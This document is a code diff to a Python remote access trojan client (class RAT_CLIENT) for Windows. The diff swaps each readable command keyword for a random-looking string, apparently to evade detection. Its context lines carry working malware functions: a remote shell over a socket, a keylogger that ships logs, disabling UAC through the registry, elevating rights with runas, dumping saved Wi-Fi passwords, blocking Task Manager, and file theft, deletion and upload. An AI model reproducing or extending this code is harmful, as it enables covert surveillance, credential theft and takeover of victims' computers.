@@ -83,7 +83,7 @@ class RAT_CLIENT:
         while True:
             command = s.recv(1024).decode()
             
-            if command == 'shell':
+            if command == 'tjhpq':
                 while 1:
                     command = s.recv(1024).decode()
                     if command.lower() == 'exit' :
@@ -97,11 +97,8 @@ class RAT_CLIENT:
                     s.send(output.encode())
                     if not output:
                         self.errorsend()
-
-            elif command == 'list':
-                pass
             
-            elif command == 'setvalue':
+            elif command == 'tgwzfrbm':
                 const = s.recv(1024).decode()
                 root = s.recv(1024).decode()
                 key2 = s.recv(1024).decode()
@@ -135,7 +132,7 @@ class RAT_CLIENT:
                 except:
                     s.send("Impossible to create key".encode())
             
-            elif command == 'delkey':
+            elif command == 'egooje':
                 const = s.recv(1024).decode()
                 root = s.recv(1024).decode()
                 try:
@@ -153,7 +150,7 @@ class RAT_CLIENT:
                 except:
                     s.send("Impossible to delete key".encode())
             
-            elif command == 'createkey':
+            elif command == 'dtheykrmh':
                 const = s.recv(1024).decode()
                 root = s.recv(1024).decode()
                 try:
@@ -171,15 +168,15 @@ class RAT_CLIENT:
                 except:
                     s.send("Impossible to create key".encode())
 
-            elif command == 'usbdrivers':
+            elif command == 'vuehwocmac':
                 p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
                 s.send(p.encode())
             
-            elif command == 'monitors':
+            elif command == 'nqqmyuya':
                 p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
                 s.send(p.encode())
 
-            elif command == 'sysinfo':
+            elif command == 'tavmslv':
                 sysinfo = str(f'''
 System: {platform.platform()} {platform.win32_edition()}
 Architecture: {platform.architecture()}
@@ -191,15 +188,15 @@ User: {os.getlogin()}
                 ''')
                 s.send(sysinfo.encode())
             
-            elif command == 'reboot':
+            elif command == 'sgestz':
                 os.system("shutdown /r /t 1")
                 s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
             
-            elif command[:7] == 'writein':
+            elif command[:7] == 'xtlxjou':
                 pyautogui.write(command.split(" ")[1])
                 s.send(f'{command.split(" ")[1]} is written'.encode())
             
-            elif command[:8] == 'readfile':
+            elif command[:8] == 'sgdhkosm':
                 try:
                     f = open(command[9:], 'r')
                     data = f.read()
@@ -209,34 +206,34 @@ User: {os.getlogin()}
                 except:
                     s.send("No such file in directory".encode())
             
-            elif command[:7] == 'abspath':
+            elif command[:7] == 'bdvtfzo':
                 try:
                     path = os.path.abspath(command[8:])
                     s.send(path.encode())
                 except:
                     s.send("No such file in directory".encode())
 
-            elif command == 'pwd':
+            elif command == 'qyg':
                 curdir = str(os.getcwd())
                 s.send(curdir.encode())
             
-            elif command == 'ipconfig':
+            elif command == 'jrfsslpo':
                 output = subprocess.check_output('ipconfig', encoding='oem')
                 s.send(output.encode())
             
-            elif command == 'portscan':
+            elif command == 'qquxxihv':
                 output = subprocess.check_output('netstat -an', encoding='oem')
                 s.send(output.encode())
             
-            elif command == 'tasklist':
+            elif command == 'ucvoqozb':
                 output = subprocess.check_output('tasklist', encoding='oem')
                 s.send(output.encode())
 
-            elif command == 'profiles':
+            elif command == 'qtrjnrla':
                 output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
                 s.send(output.encode())
             
-            elif command == 'profilepswd':
+            elif command == 'qtrjnrlxbgo':
                 profile = s.recv(6000)
                 profile = profile.decode()
                 try:
@@ -245,25 +242,25 @@ User: {os.getlogin()}
                 except:
                     self.errorsend()
             
-            elif command == 'systeminfo':
+            elif command == 'tavxjspvoy':
                 output = subprocess.check_output(f'systeminfo', encoding='oem')
                 s.send(output.encode())
             
-            elif command == 'sendmessage':
+            elif command == 'tgqhrkzajqp':
                 text = s.recv(6000).decode()
                 title = s.recv(6000).decode()
                 s.send('MessageBox has appeared'.encode())
                 user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
             
-            elif command == 'disableUAC':
+            elif command == 'ekvegrlCJM':
                 os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
             
-            elif command == 'extendrights':
+            elif command == 'fzwisjyqpree':
                 ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                 sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
                 s.send(sending.encode())
             
-            elif command == 'isuseradmin':
+            elif command == 'juxwjxhlvsy':
                 if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                     sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
                     s.send(sending.encode())
@@ -271,7 +268,7 @@ User: {os.getlogin()}
                     sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                     s.send(sending.encode())
 
-            elif command == 'keyscan_start':
+            elif command == 'lgbwhgu_ackcf':
                 global klgr
                 klgr = True
                 kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
@@ -280,7 +277,7 @@ User: {os.getlogin()}
                 Thread(target=self.keylogger, daemon=True).start()
                 s.send("Keylogger is started".encode())
             
-            elif command == 'send_logs':
+            elif command == 'tgqh_quna':
                 try:
                     f = open("keylogs.txt", 'r')
                     lines = f.readlines()
@@ -290,22 +287,22 @@ User: {os.getlogin()}
                 except:
                     self.errorsend()
             
-            elif command == 'stop_keylogger':
+            elif command == 'tvrt_pkftxqrqe':
                 klgr = False
                 s.send("The session of keylogger is terminated".encode())
             
-            elif command == 'cpu_cores':
+            elif command == 'drx_gtxla':
                 output = os.cpu_count()
                 s.send(str(output).encode())
 
-            elif command[:7] == 'delfile':
+            elif command[:7] == 'egojnrl':
                 try:
                     os.remove(command[8:])
                     s.send(f'{command[8:]} was successfully deleted'.encode())
                 except:
                     self.errorsend()
             
-            elif command[:8] == 'editfile':
+            elif command[:8] == 'fflxkosm':
                 try:
                     with open(command.split(" ")[1], 'a') as f:
                         f.write(command.split(" ")[2])
@@ -315,21 +312,21 @@ User: {os.getlogin()}
                 except:
                     self.errorsend()
             
-            elif command[:2] == 'cp':
+            elif command[:2] == 'dr':
                 try: 
                     shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
                     s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
                 except:
                     self.errorsend()
             
-            elif command[:2] == 'mv':
+            elif command[:2] == 'nx':
                 try:
                     shutil.move(command.split(" ")[1], command.split(" ")[2])
                     s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
                 except:
                     self.errorsend()
             
-            elif command[:2] == 'cd':
+            elif command[:2] == 'df':
                 command = command[3:]
                 try:
                     os.chdir(command)
@@ -338,12 +335,12 @@ User: {os.getlogin()}
                 except:
                     s.send("No such directory".encode())
             
-            elif command == 'cd ..':
+            elif command == 'df ..':
                 os.chdir('..')
                 curdir = str(os.getcwd())
                 s.send(curdir.encode())
             
-            elif command == 'dir':
+            elif command == 'eku':
                 try:
                     output = subprocess.check_output(["dir"], shell=True)
                     output = output.decode('utf8', errors='ignore')
@@ -359,13 +356,13 @@ User: {os.getlogin()}
                 except: 
                     s.send("No such directory".encode())
             
-            elif command[:10] == 'createfile':
+            elif command[:10] == 'dtheykmquo':
                 kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
                 FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                 None, CREATE_ALWAYS , 0, 0)
                 s.send(f'{command[11:]} was created'.encode())
 
-            elif command[:10] == 'searchfile':
+            elif command[:10] == 'tgdvhnmquo':
                 for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
                     if x.endswith(command.split(" ")[1]):
                         path = os.path.abspath(x)
@@ -373,11 +370,11 @@ User: {os.getlogin()}
                     else:
                         continue
             
-            elif command == 'curpid':
+            elif command == 'dwutnj':
                 pid = os.getpid()
                 s.send(str(pid).encode())
             
-            elif command == 'drivers':
+            elif command == 'etlzjxz':
                 drives = []
                 bitmask = kernel32.GetLogicalDrives()
                 letter = ord('A')
@@ -388,7 +385,7 @@ User: {os.getlogin()}
                     letter += 1
                 s.send(str(drives).encode())
             
-            elif command[:4] == 'kill':
+            elif command[:4] == 'lkop':
                 try:
                     os.system(f'TASKKILL /F /im {command[5:]}')
                     s.send(f'{command[5:]} was terminated'.encode())
@@ -400,29 +397,29 @@ User: {os.getlogin()}
                 sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
                 s.send()
             
-            elif command == 'disabletaskmgr':
+            elif command == 'ekvegrlbjcvytf':
                 global block
                 block = True
                 Thread(target=self.block_task_manager, daemon=True).start()
                 s.send("Task Manager is disabled".encode())
             
-            elif command == 'enabletaskmgr':
+            elif command == 'fpdfqkaibuxse':
                 block = False
                 s.send("Task Manager is enabled".encode())
             
-            elif command == 'localtime':
+            elif command == 'mqfeqzpun':
                 now = datetime.now()
                 current_time = now.strftime("%H:%M:%S")
                 s.send(str(current_time).encode())
             
-            elif command[:9] == 'startfile':
+            elif command[:9] == 'tvdvylptn':
                 try:
                     s.send(f'{command[10:]} was started'.encode())
                     os.startfile(command[10:])
                 except:
                     self.errorsend()
 
-            elif command[:8] == 'download':
+            elif command[:8] == 'eqzrquhl':
                 try:
                     file = open(command.split(" ")[1], 'rb')
                     data = file.read()
@@ -430,28 +427,28 @@ User: {os.getlogin()}
                 except:
                     self.errorsend()
 
-            elif command == 'upload':
+            elif command == 'vrosfj':
                 filename = s.recv(6000)
                 newfile = open(filename, 'wb')
                 data = s.recv(6000)
                 newfile.write(data)
                 newfile.close()
             
-            elif command[:5] == 'mkdir':
+            elif command[:5] == 'nmgmw':
                 try:
                     os.mkdir(command[6:])
                     s.send(f'Directory {command[6:]} was created'.encode())
                 except:
                     self.errorsend()
             
-            elif command[:5] == 'rmdir':
+            elif command[:5] == 'sogmw':
                 try:
                     shutil.rmtree(command[6:])
                     s.send(f'Directory {command[6:]} was removed'.encode())
                 except:
                     self.errorsend()
 
-            elif command == 'exit':
+            elif command == 'fzlx':
                 s.send(b"exit")
                 break
 
